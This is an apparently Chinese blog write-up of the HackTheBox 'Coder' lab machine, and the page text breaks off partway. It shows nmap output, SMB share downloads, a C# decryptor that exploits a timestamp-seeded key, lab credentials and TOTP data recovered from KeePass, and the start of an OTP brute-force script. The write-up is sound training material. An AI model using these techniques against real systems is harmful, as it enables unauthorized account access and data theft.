<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Coder - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Coder 10.10.11.207                                                                                                              端口扫描80，443和常规域端口： 1234567891011">
<meta property="og:type" content="article">
<meta property="og:title" content="Coder - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2023/04/05/Coder-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Coder 10.10.11.207                                                                                                              端口扫描80，443和常规域端口： 1234567891011">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040401.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040402.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040403.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040404.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040405.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040406.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040407.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040408.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040409.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040410.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040411.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040412.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040413.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040414.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040415.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040416.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040417.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040418.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040419.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040420.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040421.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040422.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040423.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040424.jpg">
<meta property="article:published_time" content="2023-04-05T04:33:09.000Z">
<meta property="article:modified_time" content="2023-12-18T00:36:23.616Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040401.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Coder - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="搜尋">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Coder - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-04-05T04:33:09.000Z" itemprop="datePublished" class="page-time">
  2023-04-05
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80-443"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80&#x2F;443</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#445"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">445</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SMB"><span class="post-toc-number">3.</span> <span class="post-toc-text">SMB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Development"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">Development</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Encrypter-exe"><span class="post-toc-number">4.</span> <span class="post-toc-text">Encrypter.exe</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#keepass"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">keepass</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Decrypt-cs"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Decrypt.cs</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Authenticator-backup-codes"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Authenticator backup codes</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#teamcity-OTP"><span class="post-toc-number">5.</span> <span class="post-toc-text">teamcity OTP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#非预期-爆破OTP"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">非预期 爆破OTP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#brute-py"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">brute.py</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#预期方法"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">预期方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#teamcity-getshell"><span class="post-toc-number">6.</span> <span class="post-toc-text">teamcity getshell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#e-black-信息"><span class="post-toc-number">7.</span> <span class="post-toc-text">e.black 信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#enc-txt"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">enc.txt</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">9.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ADCS"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">ADCS</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">10.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">root flag</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">11.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Coder-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Coder - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-04-05 12:33:09" datetime="2023-04-05T04:33:09.000Z"  itemprop="datePublished">2023-04-05</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Coder" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Coder</a></li>
<li>10.10.11.207</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040401.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80，443和常规域端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.207</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 14:41 CST</span><br><span class="line">Nmap scan report for 10.10.11.207</span><br><span class="line">Host is up (0.083s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-04 08:44:05Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.coder.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb</span><br><span class="line">| Not valid before: 2022-06-30T04:24:26</span><br><span class="line">|_Not valid after:  2023-06-30T04:24:26</span><br><span class="line">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US</span><br><span class="line">| Not valid before: 2022-11-04T17:25:43</span><br><span class="line">|_Not valid after:  2032-11-01T17:25:43</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.coder.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb</span><br><span class="line">| Not valid before: 2022-06-30T04:24:26</span><br><span class="line">|_Not valid after:  2023-06-30T04:24:26</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.coder.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb</span><br><span class="line">| Not valid before: 2022-06-30T04:24:26</span><br><span class="line">|_Not valid after:  2023-06-30T04:24:26</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.coder.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb</span><br><span class="line">| Not valid before: 2022-06-30T04:24:26</span><br><span class="line">|_Not valid after:  2023-06-30T04:24:26</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   311:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2023-04-04T08:44:43</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 2h01m49s, deviation: 0s, median: 2h01m49s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.53 seconds</span><br></pre></td></tr></table></figure>

<h2 id="80-443"><a href="#80-443" class="headerlink" title="80/443"></a>80/443</h2><p>直接访问是IIS默认页面：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040402.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="445"><a href="#445" class="headerlink" title="445"></a>445</h2><p>smb可以匿名访问：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040403.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><h2 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h2><p>Development里发现一个加密文件和对应的加密程序，还发现有adcs相关内容：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040404.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>下载下来分析：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smb: \Temporary Projects\&gt; mask ""</span><br><span class="line">smb: \Temporary Projects\&gt; recurse ON</span><br><span class="line">smb: \Temporary Projects\&gt; prompt OFF</span><br><span class="line">smb: \Temporary Projects\&gt; cd ..</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure>

<h1 id="Encrypter-exe"><a href="#Encrypter-exe" class="headerlink" title="Encrypter.exe"></a>Encrypter.exe</h1><p>.net程序，直接反编译分析代码,根据代码可以知道是根据时间戳作为随机数种子生成key和iv，使用AES进行加密：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040405.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>所以直接根据文件时间得到当时加密的时间戳(注意时差)，对应编写解密程序,解密得到一个7z压缩包：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040406.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="keepass"><a href="#keepass" class="headerlink" title="keepass"></a>keepass</h2><p>解压得到一个key和一个keepass密码库，直接使用key解密即可得到保存的一些信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Authenticator backup codes xxx</span><br><span class="line">Teamcity s.blade veh5nUSZFFoqz9CrrhSeuwhA https:&#x2F;&#x2F;teamcity-dev.coder.htb</span><br><span class="line">O365 s.blade@coder.htb AmcwNO60Zg3vca3o0HDrTC6D</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040407.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040408.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="Decrypt-cs"><a href="#Decrypt-cs" class="headerlink" title="Decrypt.cs"></a>Decrypt.cs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">using System.IO;</span><br><span class="line">using System;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line"></span><br><span class="line">public class HelloWorld</span><br><span class="line">&#123;</span><br><span class="line">    public static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        FileInfo fileInfo &#x3D; new FileInfo(&quot;s.blade.enc&quot;);</span><br><span class="line">        string destFile &#x3D; Path.ChangeExtension(fileInfo.Name, &quot;.dec&quot;);</span><br><span class="line">        long value &#x3D; 1668205028;</span><br><span class="line">        Random random &#x3D; new Random(Convert.ToInt32(value));</span><br><span class="line">        byte[] array &#x3D; new byte[16];</span><br><span class="line">        random.NextBytes(array);</span><br><span class="line">        byte[] array2 &#x3D; new byte[32];</span><br><span class="line">        random.NextBytes(array2);</span><br><span class="line">        byte[] array3 &#x3D; DecryptFile(fileInfo.Name, destFile, array2, array);</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)</span><br><span class="line">    &#123;</span><br><span class="line">        using (RijndaelManaged rijndaelManaged &#x3D; new RijndaelManaged())</span><br><span class="line">        &#123;</span><br><span class="line">            FileStream stream &#x3D; new FileStream(sourceFile, FileMode.Open);</span><br><span class="line">            ICryptoTransform transform &#x3D; rijndaelManaged.CreateDecryptor(Key, IV);</span><br><span class="line">            CryptoStream cryptoStream &#x3D; new CryptoStream(stream, transform, CryptoStreamMode.Read);</span><br><span class="line">            FileStream fileStream &#x3D; new FileStream(destFile, FileMode.Create);</span><br><span class="line">            byte[] array &#x3D; new byte[1024];</span><br><span class="line">            int count;</span><br><span class="line">            while ((count &#x3D; cryptoStream.Read(array, 0, array.Length)) !&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                fileStream.Write(array, 0, count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Authenticator-backup-codes"><a href="#Authenticator-backup-codes" class="headerlink" title="Authenticator backup codes"></a>Authenticator backup codes</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"6132e897-44a2-4d14-92d2-12954724e83f"</span>: &#123;</span><br><span class="line">    <span class="attr">"encrypted"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"hash"</span>: <span class="string">"6132e897-44a2-4d14-92d2-12954724e83f"</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"totp"</span>,</span><br><span class="line">    <span class="attr">"secret"</span>: <span class="string">"U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2"</span>,</span><br><span class="line">    <span class="attr">"issuer"</span>: <span class="string">"TeamCity"</span>,</span><br><span class="line">    <span class="attr">"account"</span>: <span class="string">"s.blade"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"key"</span>: &#123;</span><br><span class="line">    <span class="attr">"enc"</span>: <span class="string">"U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1"</span>,</span><br><span class="line">    <span class="attr">"hash"</span>: <span class="string">"$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="teamcity-OTP"><a href="#teamcity-OTP" class="headerlink" title="teamcity OTP"></a>teamcity OTP</h1><p>keepass里得到 teamcity相关域名，加hosts后访问,尝试登录，账号密码正确但还有OTP：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040409.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="非预期-爆破OTP"><a href="#非预期-爆破OTP" class="headerlink" title="非预期 爆破OTP"></a>非预期 爆破OTP</h2><p>OTP 6位数字，没锁定机制，花时间能爆破出来：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040410.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023040411.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="brute-py"><a href="#brute-py" class="headerlink" title="brute.py"></a>brute.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> loguru <span 